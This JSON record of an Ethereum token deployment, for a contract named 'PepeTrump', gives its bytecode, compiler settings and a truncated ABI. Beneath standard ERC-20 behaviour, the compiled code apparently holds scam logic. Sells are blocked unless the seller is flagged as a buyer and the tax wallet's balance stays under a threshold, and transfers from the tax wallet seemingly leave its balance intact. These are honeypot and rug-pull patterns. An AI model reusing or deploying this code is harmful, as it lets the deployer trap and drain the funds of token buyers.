{
    "address": "0x52FE190D632c22aD6E4a0aA0916a4B45aC073be6",
    "tx_hash": "e8353208e0ab5689da214081e44d34cc499a5b43a3df41f90865ebbd449ce570",
    "block_number": 18002999,
    "timestamp": 1693103027,
    "gas_used_in_creation": 1814943,
    "creation_bytecode": "60806040526006805460ff191690556200001c6009600a62000357565b6200002c906305f5e1006200036e565b6007556200003d6009600a62000357565b6200004d906305f5e1006200036e565b6008556200005e6009600a62000357565b6200006e906305f5e1006200036e565b6009556009600a62000081919062000357565b62000091906305f5e1006200036e565b600a556005600b819055600c556001600d819055600e8190556004600f556010555f60118190556012556014805461ffff60a81b19169055348015620000d5575f80fd5b505f80546001600160a01b031916339081178255604051909182917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0908290a35060068054610100600160a81b031916744cd7cae806a3cb013a82e710315fc84e681a639e001790556200014c6009600a62000357565b6200015c906305f5e1006200036e565b335f908152600160208190526040822092909255600390620001855f546001600160a01b031690565b6001600160a01b03908116825260208083019390935260409182015f908120805495151560ff1996871617905530815260039093528183208054851660019081179091556006546101009004909116835291208054909216179055620001e83390565b6001600160a01b03165f7fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef620002216009600a62000357565b62000231906305f5e1006200036e565b60405190815260200160405180910390a362000388565b634e487b7160e01b5f52601160045260245ffd5b600181815b808511156200029c57815f190482111562000280576200028062000248565b808516156200028e57918102915b93841c939080029062000261565b509250929050565b5f82620002b45750600162000351565b81620002c257505f62000351565b8160018114620002db5760028114620002e65762000306565b600191505062000351565b60ff841115620002fa57620002fa62000248565b50506001821b62000351565b5060208310610133831016604e8410600b84101617156200032b575081810a62000351565b6200033783836200025c565b805f19048211156200034d576200034d62000248565b0290505b92915050565b5f6200036760ff841683620002a4565b9392505050565b808202811582820484141762000351576200035162000248565b6118f480620003965f395ff3fe608060405260043610610108575f3560e01c80637d1db4a511610092578063a9059cbb11610062578063a9059cbb146102d6578063bf474bed146102f5578063c876d0b91461030a578063c9567bf914610323578063dd62ed3e14610337575f80fd5b80637d1db4a5146102555780638da5cb5b1461026a5780638f9a55c01461029057806395d89b41146102a5575f80fd5b806323b872dd116100d857806323b872dd146101bd578063313ce567146101dc57806370a08231146101f7578063715018a61461022b578063751039fc14610241575f80fd5b806306fdde0314610113578063095ea7b3146101575780630faee56f1461018657806318160ddd146101a9575f80fd5b3661010f57005b5f80fd5b34801561011e575f80fd5b5060408051808201909152600a815269050657065205472756d760b41b60208201525b60405161014e91906114e7565b60405180910390f35b348015610162575f80fd5b50610176610171366004611549565b61037b565b604051901515815260200161014e565b348015610191575f80fd5b5061019b600a5481565b60405190815260200161014e565b3480156101b4575f80fd5b5061019b610391565b3480156101c8575f80fd5b506101766101d7366004611573565b6103b1565b3480156101e7575f80fd5b506040516009815260200161014e565b348015610202575f80fd5b5061019b6102113660046115b1565b6001600160a01b03165f9081526001602052604090205490565b348015610236575f80fd5b5061023f610419565b005b34801561024c575f80fd5b5061023f610493565b348015610260575f80fd5b5061019b60075481565b348015610275575f80fd5b505f546040516001600160a01b03909116815260200161014e565b34801561029b575f80fd5b5061019b60085481565b3480156102b0575f80fd5b506040805180820190915260098152680506570655472756d760bc1b6020820152610141565b3480156102e1575f80fd5b506101766102f0366004611549565b61054e565b348015610300575f80fd5b5061019b60095481565b348015610315575f80fd5b506006546101769060ff1681565b34801561032e575f80fd5b5061023f61055a565b348015610342575f80fd5b5061019b6103513660046115cc565b6001600160a01b039182165f90815260026020908152604080832093909416825291909152205490565b5f610387338484610903565b5060015b92915050565b5f61039e6009600a6116f7565b6103ac906305f5e100611705565b905090565b5f6103bd848484610a26565b61040e843361040985604051806060016040528060288152602001611897602891396001600160a01b038a165f9081526002602090815260408083203384529091529020549190611114565b610903565b5060015b9392505050565b5f546001600160a01b0316331461044b5760405162461bcd60e51b81526004016104429061171c565b60405180910390fd5b5f80546040516001600160a01b03909116907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0908390a35f80546001600160a01b0319169055565b5f546001600160a01b031633146104bc5760405162461bcd60e51b81526004016104429061171c565b6104c86009600a6116f7565b6104d6906305f5e100611705565b6007556104e56009600a6116f7565b6104f3906305f5e100611705565b6008556006805460ff191690557f947f344d56e1e8c70dc492fb94c4ddddd490c016aab685f5e7e47b2e85cb44cf61052d6009600a6116f7565b61053b906305f5e100611705565b60405190815260200160405180910390a1565b5f610387338484610a26565b5f546001600160a01b031633146105835760405162461bcd60e51b81526004016104429061171c565b601454600160a01b900460ff16156105dd5760405162461bcd60e51b815260206004820152601760248201527f74726164696e6720697320616c7265616479206f70656e0000000000000000006044820152606401610442565b601380546001600160a01b031916737a250d5630b4cf539739df2c5dacb4c659f2488d9081179091556106269030906106186009600a6116f7565b610409906305f5e100611705565b60135f9054906101000a90046001600160a01b03166001600160a01b031663c45a01556040518163ffffffff1660e01b8152600401602060405180830381865afa158015610676573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061069a9190611751565b6001600160a01b031663c9c653963060135f9054906101000a90046001600160a01b03166001600160a01b031663ad5c46486040518163ffffffff1660e01b8152600401602060405180830381865afa1580156106f9573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061071d9190611751565b6040516001600160e01b031960e085901b1681526001600160a01b039283166004820152911660248201526044016020604051808303815f875af1158015610767573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061078b9190611751565b601480546001600160a01b039283166001600160a01b03199091161790556013541663f305d71947306107d2816001600160a01b03165f9081526001602052604090205490565b5f806107e55f546001600160a01b031690565b60405160e088901b6001600160e01b03191681526001600160a01b03958616600482015260248101949094526044840192909252606483015290911660848201524260a482015260c40160606040518083038185885af115801561084b573d5f803e3d5ffd5b50505050506040513d601f19601f82011682018060405250810190610870919061176c565b505060145460135460405163095ea7b360e01b81526001600160a01b0391821660048201525f1960248201529116915063095ea7b3906044016020604051808303815f875af11580156108c5573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906108e99190611797565b506014805462ff00ff60a01b19166201000160a01b179055565b6001600160a01b0383166109655760405162461bcd60e51b8152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646044820152637265737360e01b6064820152608401610442565b6001600160a01b0382166109c65760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604482015261737360f01b6064820152608401610442565b6001600160a01b038381165f8181526002602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925910160405180910390a3505050565b6001600160a01b038316610a8a5760405162461bcd60e51b815260206004820152602560248201527f45524332303a207472616e736665722066726f6d20746865207a65726f206164604482015264647265737360d81b6064820152608401610442565b6001600160a01b038216610aec5760405162461bcd60e51b815260206004820152602360248201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260448201526265737360e81b6064820152608401610442565b5f8111610b4d5760405162461bcd60e51b815260206004820152602960248201527f5472616e7366657220616d6f756e74206d7573742062652067726561746572206044820152687468616e207a65726f60b81b6064820152608401610442565b5f80546001600160a01b03858116911614801590610b7857505f546001600160a01b03848116911614155b15610fd55760065460ff1615610c34576013546001600160a01b03848116911614801590610bb457506014546001600160a01b03848116911614155b15610c3457325f908152600560205260409020544311610c225760405162461bcd60e51b8152602060048201526024808201527f4f6e6c79206f6e65207472616e736665722070657220626c6f636b20616c6c6f6044820152633bb2b21760e11b6064820152608401610442565b325f9081526005602052604090204390555b6014546001600160a01b038581169116148015610c5f57506013546001600160a01b03848116911614155b8015610c8357506001600160a01b0383165f9081526003602052604090205460ff16155b15610dcf57600754821115610cd65760405162461bcd60e51b815260206004820152601960248201527822bc31b2b2b239903a3432902fb6b0bc2a3c20b6b7bab73a1760391b6044820152606401610442565b60085482610cf8856001600160a01b03165f9081526001602052604090205490565b610d0291906117b6565b1115610d505760405162461bcd60e51b815260206004820152601a60248201527f4578636565647320746865206d617857616c6c657453697a652e0000000000006044820152606401610442565b6011546012541015610d6757823b15610d67575f80fd5b60128054905f610d76836117c9565b90915550506001600160a01b0383165f908152600460205260409020805460ff19166001179055600f54601254610dcc91606491610dc69110610dbb57600b54610dbf565b600d545b859061114c565b906111ca565b90505b6014546001600160a01b038481169116148015610df557506001600160a01b0384163014155b8015610e1957506001600160a01b0384165f9081526003602052604090205460ff16155b15610ef0576007548211158015610e4f5750600a5460065461010090046001600160a01b03165f90815260016020526040902054105b610e975760405162461bcd60e51b815260206004820152601960248201527822bc31b2b2b239903a3432902fb6b0bc2a3c20b6b7bab73a1760391b6044820152606401610442565b610ebc6064610dc660105460125411610eb257600c54610dbf565b600e54859061114c565b9050601154601254118015610ee857506001600160a01b0384165f9081526004602052604090205460ff165b610ef0575f80fd5b305f90815260016020526040902054601454600160a81b900460ff16158015610f2657506014546001600160a01b038581169116145b8015610f3b5750601454600160b01b900460ff165b8015610f48575060095481115b8015610f575750601154601254115b8015610f7b57506001600160a01b0384165f9081526003602052604090205460ff16155b8015610f9f57506001600160a01b0385165f9081526003602052604090205460ff16155b15610fd357610fc1610fbc84610fb784600a5461120b565b61120b565b61121f565b478015610fd157610fd1476113a8565b505b505b801561104d57305f90815260016020526040902054610ff490826113e7565b305f81815260016020526040908190209290925590516001600160a01b038616907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef906110449085815260200190565b60405180910390a35b6001600160a01b0384165f9081526001602052604090205461107190859084611445565b6001600160a01b0385165f908152600160205260409020556110b4611096838361147a565b6001600160a01b0385165f90815260016020526040902054906113e7565b6001600160a01b038085165f8181526001602052604090209290925585167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef6110fd858561147a565b60405190815260200160405180910390a350505050565b5f81848411156111375760405162461bcd60e51b815260040161044291906114e7565b505f61114384866117e1565b95945050505050565b5f825f0361115b57505f61038b565b5f6111668385611705565b90508261117385836117f4565b146104125760405162461bcd60e51b815260206004820152602160248201527f536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f6044820152607760f81b6064820152608401610442565b5f61041283836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f0000000000008152506114bb565b5f8183116112195782610412565b50919050565b6014805460ff60a81b1916600160a81b179055801561139857601454600160a01b900460ff1615611398576040805160028082526060820183525f9260208301908036833701905050905030815f8151811061127d5761127d611813565b6001600160a01b03928316602091820292909201810191909152601354604080516315ab88c960e31b81529051919093169263ad5c46489260048083019391928290030181865afa1580156112d4573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906112f89190611751565b8160018151811061130b5761130b611813565b6001600160a01b0392831660209182029290920101526013546113319130911684610903565b60135460405163791ac94760e01b81526001600160a01b039091169063791ac947906113699085905f90869030904290600401611827565b5f604051808303815f87803b158015611380575f80fd5b505af1158015611392573d5f803e3d5ffd5b50505050505b506014805460ff60a81b19169055565b6006546040516101009091046001600160a01b0316906108fc8315029083905f818181858888f193505050501580156113e3573d5f803e3d5ffd5b5050565b5f806113f383856117b6565b9050838110156104125760405162461bcd60e51b815260206004820152601b60248201527f536166654d6174683a206164646974696f6e206f766572666c6f7700000000006044820152606401610442565b6006545f906001600160a01b03610100909104811690851603611469575081610412565b611473838361147a565b9050610412565b5f61041283836040518060400160405280601f81526020017f536166654d6174683a20207375627472616374696f6e206f766572666c6f7700815250611114565b5f81836114db5760405162461bcd60e51b815260040161044291906114e7565b505f61114384866117f4565b5f6020808352835180828501525f5b81811015611512578581018301518582016040015282016114f6565b505f604082860101526040601f19601f8301168501019250505092915050565b6001600160a01b0381168114611546575f80fd5b50565b5f806040838503121561155a575f80fd5b823561156581611532565b946020939093013593505050565b5f805f60608486031215611585575f80fd5b833561159081611532565b925060208401356115a081611532565b929592945050506040919091013590565b5f602082840312156115c1575f80fd5b813561041281611532565b5f80604083850312156115dd575f80fd5b82356115e881611532565b915060208301356115f881611532565b809150509250929050565b634e487b7160e01b5f52601160045260245ffd5b600181815b8085111561165157815f190482111561163757611637611603565b8085161561164457918102915b93841c939080029061161c565b509250929050565b5f826116675750600161038b565b8161167357505f61038b565b81600181146116895760028114611693576116af565b600191505061038b565b60ff8411156116a4576116a4611603565b50506001821b61038b565b5060208310610133831016604e8410600b84101617156116d2575081810a61038b565b6116dc8383611617565b805f19048211156116ef576116ef611603565b029392505050565b5f61041260ff841683611659565b808202811582820484141761038b5761038b611603565b6020808252818101527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604082015260600190565b5f60208284031215611761575f80fd5b815161041281611532565b5f805f6060848603121561177e575f80fd5b8351925060208401519150604084015190509250925092565b5f602082840312156117a7575f80fd5b81518015158114610412575f80fd5b8082018082111561038b5761038b611603565b5f600182016117da576117da611603565b5060010190565b8181038181111561038b5761038b611603565b5f8261180e57634e487b7160e01b5f52601260045260245ffd5b500490565b634e487b7160e01b5f52603260045260245ffd5b5f60a082018783526020878185015260a0604085015281875180845260c08601915082890193505f5b818110156118755784516001600160a01b031683529383019391830191600101611850565b50506001600160a01b0396909616606085015250505060800152939250505056fe45524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e6365a2646970667358221220b5ed57f80a34973257b4fe3c1f4045e27a259862ca6e4c88cfc045ca73176e1964736f6c63430008140033",
    "runtime_bytecode": "608060405260043610610108575f3560e01c80637d1db4a511610092578063a9059cbb11610062578063a9059cbb146102d6578063bf474bed146102f5578063c876d0b91461030a578063c9567bf914610323578063dd62ed3e14610337575f80fd5b80637d1db4a5146102555780638da5cb5b1461026a5780638f9a55c01461029057806395d89b41146102a5575f80fd5b806323b872dd116100d857806323b872dd146101bd578063313ce567146101dc57806370a08231146101f7578063715018a61461022b578063751039fc14610241575f80fd5b806306fdde0314610113578063095ea7b3146101575780630faee56f1461018657806318160ddd146101a9575f80fd5b3661010f57005b5f80fd5b34801561011e575f80fd5b5060408051808201909152600a815269050657065205472756d760b41b60208201525b60405161014e91906114e7565b60405180910390f35b348015610162575f80fd5b50610176610171366004611549565b61037b565b604051901515815260200161014e565b348015610191575f80fd5b5061019b600a5481565b60405190815260200161014e565b3480156101b4575f80fd5b5061019b610391565b3480156101c8575f80fd5b506101766101d7366004611573565b6103b1565b3480156101e7575f80fd5b506040516009815260200161014e565b348015610202575f80fd5b5061019b6102113660046115b1565b6001600160a01b03165f9081526001602052604090205490565b348015610236575f80fd5b5061023f610419565b005b34801561024c575f80fd5b5061023f610493565b348015610260575f80fd5b5061019b60075481565b348015610275575f80fd5b505f546040516001600160a01b03909116815260200161014e565b34801561029b575f80fd5b5061019b60085481565b3480156102b0575f80fd5b506040805180820190915260098152680506570655472756d760bc1b6020820152610141565b3480156102e1575f80fd5b506101766102f0366004611549565b61054e565b348015610300575f80fd5b5061019b60095481565b348015610315575f80fd5b506006546101769060ff1681565b34801561032e575f80fd5b5061023f61055a565b348015610342575f80fd5b5061019b6103513660046115cc565b6001600160a01b039182165f90815260026020908152604080832093909416825291909152205490565b5f610387338484610903565b5060015b92915050565b5f61039e6009600a6116f7565b6103ac906305f5e100611705565b905090565b5f6103bd848484610a26565b61040e843361040985604051806060016040528060288152602001611897602891396001600160a01b038a165f9081526002602090815260408083203384529091529020549190611114565b610903565b5060015b9392505050565b5f546001600160a01b0316331461044b5760405162461bcd60e51b81526004016104429061171c565b60405180910390fd5b5f80546040516001600160a01b03909116907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0908390a35f80546001600160a01b0319169055565b5f546001600160a01b031633146104bc5760405162461bcd60e51b81526004016104429061171c565b6104c86009600a6116f7565b6104d6906305f5e100611705565b6007556104e56009600a6116f7565b6104f3906305f5e100611705565b6008556006805460ff191690557f947f344d56e1e8c70dc492fb94c4ddddd490c016aab685f5e7e47b2e85cb44cf61052d6009600a6116f7565b61053b906305f5e100611705565b60405190815260200160405180910390a1565b5f610387338484610a26565b5f546001600160a01b031633146105835760405162461bcd60e51b81526004016104429061171c565b601454600160a01b900460ff16156105dd5760405162461bcd60e51b815260206004820152601760248201527f74726164696e6720697320616c7265616479206f70656e0000000000000000006044820152606401610442565b601380546001600160a01b031916737a250d5630b4cf539739df2c5dacb4c659f2488d9081179091556106269030906106186009600a6116f7565b610409906305f5e100611705565b60135f9054906101000a90046001600160a01b03166001600160a01b031663c45a01556040518163ffffffff1660e01b8152600401602060405180830381865afa158015610676573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061069a9190611751565b6001600160a01b031663c9c653963060135f9054906101000a90046001600160a01b03166001600160a01b031663ad5c46486040518163ffffffff1660e01b8152600401602060405180830381865afa1580156106f9573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061071d9190611751565b6040516001600160e01b031960e085901b1681526001600160a01b039283166004820152911660248201526044016020604051808303815f875af1158015610767573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061078b9190611751565b601480546001600160a01b039283166001600160a01b03199091161790556013541663f305d71947306107d2816001600160a01b03165f9081526001602052604090205490565b5f806107e55f546001600160a01b031690565b60405160e088901b6001600160e01b03191681526001600160a01b03958616600482015260248101949094526044840192909252606483015290911660848201524260a482015260c40160606040518083038185885af115801561084b573d5f803e3d5ffd5b50505050506040513d601f19601f82011682018060405250810190610870919061176c565b505060145460135460405163095ea7b360e01b81526001600160a01b0391821660048201525f1960248201529116915063095ea7b3906044016020604051808303815f875af11580156108c5573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906108e99190611797565b506014805462ff00ff60a01b19166201000160a01b179055565b6001600160a01b0383166109655760405162461bcd60e51b8152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646044820152637265737360e01b6064820152608401610442565b6001600160a01b0382166109c65760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604482015261737360f01b6064820152608401610442565b6001600160a01b038381165f8181526002602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925910160405180910390a3505050565b6001600160a01b038316610a8a5760405162461bcd60e51b815260206004820152602560248201527f45524332303a207472616e736665722066726f6d20746865207a65726f206164604482015264647265737360d81b6064820152608401610442565b6001600160a01b038216610aec5760405162461bcd60e51b815260206004820152602360248201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260448201526265737360e81b6064820152608401610442565b5f8111610b4d5760405162461bcd60e51b815260206004820152602960248201527f5472616e7366657220616d6f756e74206d7573742062652067726561746572206044820152687468616e207a65726f60b81b6064820152608401610442565b5f80546001600160a01b03858116911614801590610b7857505f546001600160a01b03848116911614155b15610fd55760065460ff1615610c34576013546001600160a01b03848116911614801590610bb457506014546001600160a01b03848116911614155b15610c3457325f908152600560205260409020544311610c225760405162461bcd60e51b8152602060048201526024808201527f4f6e6c79206f6e65207472616e736665722070657220626c6f636b20616c6c6f6044820152633bb2b21760e11b6064820152608401610442565b325f9081526005602052604090204390555b6014546001600160a01b038581169116148015610c5f57506013546001600160a01b03848116911614155b8015610c8357506001600160a01b0383165f9081526003602052604090205460ff16155b15610dcf57600754821115610cd65760405162461bcd60e51b815260206004820152601960248201527822bc31b2b2b239903a3432902fb6b0bc2a3c20b6b7bab73a1760391b6044820152606401610442565b60085482610cf8856001600160a01b03165f9081526001602052604090205490565b610d0291906117b6565b1115610d505760405162461bcd60e51b815260206004820152601a60248201527f4578636565647320746865206d617857616c6c657453697a652e0000000000006044820152606401610442565b6011546012541015610d6757823b15610d67575f80fd5b60128054905f610d76836117c9565b90915550506001600160a01b0383165f908152600460205260409020805460ff19166001179055600f54601254610dcc91606491610dc69110610dbb57600b54610dbf565b600d545b859061114c565b906111ca565b90505b6014546001600160a01b038481169116148015610df557506001600160a01b0384163014155b8015610e1957506001600160a01b0384165f9081526003602052604090205460ff16155b15610ef0576007548211158015610e4f5750600a5460065461010090046001600160a01b03165f90815260016020526040902054105b610e975760405162461bcd60e51b815260206004820152601960248201527822bc31b2b2b239903a3432902fb6b0bc2a3c20b6b7bab73a1760391b6044820152606401610442565b610ebc6064610dc660105460125411610eb257600c54610dbf565b600e54859061114c565b9050601154601254118015610ee857506001600160a01b0384165f9081526004602052604090205460ff165b610ef0575f80fd5b305f90815260016020526040902054601454600160a81b900460ff16158015610f2657506014546001600160a01b038581169116145b8015610f3b5750601454600160b01b900460ff165b8015610f48575060095481115b8015610f575750601154601254115b8015610f7b57506001600160a01b0384165f9081526003602052604090205460ff16155b8015610f9f57506001600160a01b0385165f9081526003602052604090205460ff16155b15610fd357610fc1610fbc84610fb784600a5461120b565b61120b565b61121f565b478015610fd157610fd1476113a8565b505b505b801561104d57305f90815260016020526040902054610ff490826113e7565b305f81815260016020526040908190209290925590516001600160a01b038616907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef906110449085815260200190565b60405180910390a35b6001600160a01b0384165f9081526001602052604090205461107190859084611445565b6001600160a01b0385165f908152600160205260409020556110b4611096838361147a565b6001600160a01b0385165f90815260016020526040902054906113e7565b6001600160a01b038085165f8181526001602052604090209290925585167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef6110fd858561147a565b60405190815260200160405180910390a350505050565b5f81848411156111375760405162461bcd60e51b815260040161044291906114e7565b505f61114384866117e1565b95945050505050565b5f825f0361115b57505f61038b565b5f6111668385611705565b90508261117385836117f4565b146104125760405162461bcd60e51b815260206004820152602160248201527f536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f6044820152607760f81b6064820152608401610442565b5f61041283836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f0000000000008152506114bb565b5f8183116112195782610412565b50919050565b6014805460ff60a81b1916600160a81b179055801561139857601454600160a01b900460ff1615611398576040805160028082526060820183525f9260208301908036833701905050905030815f8151811061127d5761127d611813565b6001600160a01b03928316602091820292909201810191909152601354604080516315ab88c960e31b81529051919093169263ad5c46489260048083019391928290030181865afa1580156112d4573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906112f89190611751565b8160018151811061130b5761130b611813565b6001600160a01b0392831660209182029290920101526013546113319130911684610903565b60135460405163791ac94760e01b81526001600160a01b039091169063791ac947906113699085905f90869030904290600401611827565b5f604051808303815f87803b158015611380575f80fd5b505af1158015611392573d5f803e3d5ffd5b50505050505b506014805460ff60a81b19169055565b6006546040516101009091046001600160a01b0316906108fc8315029083905f818181858888f193505050501580156113e3573d5f803e3d5ffd5b5050565b5f806113f383856117b6565b9050838110156104125760405162461bcd60e51b815260206004820152601b60248201527f536166654d6174683a206164646974696f6e206f766572666c6f7700000000006044820152606401610442565b6006545f906001600160a01b03610100909104811690851603611469575081610412565b611473838361147a565b9050610412565b5f61041283836040518060400160405280601f81526020017f536166654d6174683a20207375627472616374696f6e206f766572666c6f7700815250611114565b5f81836114db5760405162461bcd60e51b815260040161044291906114e7565b505f61114384866117f4565b5f6020808352835180828501525f5b81811015611512578581018301518582016040015282016114f6565b505f604082860101526040601f19601f8301168501019250505092915050565b6001600160a01b0381168114611546575f80fd5b50565b5f806040838503121561155a575f80fd5b823561156581611532565b946020939093013593505050565b5f805f60608486031215611585575f80fd5b833561159081611532565b925060208401356115a081611532565b929592945050506040919091013590565b5f602082840312156115c1575f80fd5b813561041281611532565b5f80604083850312156115dd575f80fd5b82356115e881611532565b915060208301356115f881611532565b809150509250929050565b634e487b7160e01b5f52601160045260245ffd5b600181815b8085111561165157815f190482111561163757611637611603565b8085161561164457918102915b93841c939080029061161c565b509250929050565b5f826116675750600161038b565b8161167357505f61038b565b81600181146116895760028114611693576116af565b600191505061038b565b60ff8411156116a4576116a4611603565b50506001821b61038b565b5060208310610133831016604e8410600b84101617156116d2575081810a61038b565b6116dc8383611617565b805f19048211156116ef576116ef611603565b029392505050565b5f61041260ff841683611659565b808202811582820484141761038b5761038b611603565b6020808252818101527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604082015260600190565b5f60208284031215611761575f80fd5b815161041281611532565b5f805f6060848603121561177e575f80fd5b8351925060208401519150604084015190509250925092565b5f602082840312156117a7575f80fd5b81518015158114610412575f80fd5b8082018082111561038b5761038b611603565b5f600182016117da576117da611603565b5060010190565b8181038181111561038b5761038b611603565b5f8261180e57634e487b7160e01b5f52601260045260245ffd5b500490565b634e487b7160e01b5f52603260045260245ffd5b5f60a082018783526020878185015260a0604085015281875180845260c08601915082890193505f5b818110156118755784516001600160a01b031683529383019391830191600101611850565b50506001600160a01b0396909616606085015250505060800152939250505056fe45524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e6365a2646970667358221220b5ed57f80a34973257b4fe3c1f4045e27a259862ca6e4c88cfc045ca73176e1964736f6c63430008140033",
    "contract_name": "PepeTrump",
    "compiler_version": "v0.8.20+commit.a1b79de6",
    "optimization_used": "1",
    "runs": "200",
    "abi": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_maxTxAmount\",\"type\":\"uint256\"}],\"name\":\"MaxTxAmountUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_maxTaxSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxWalletSize\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_taxSwapThreshold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"transferDelayEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\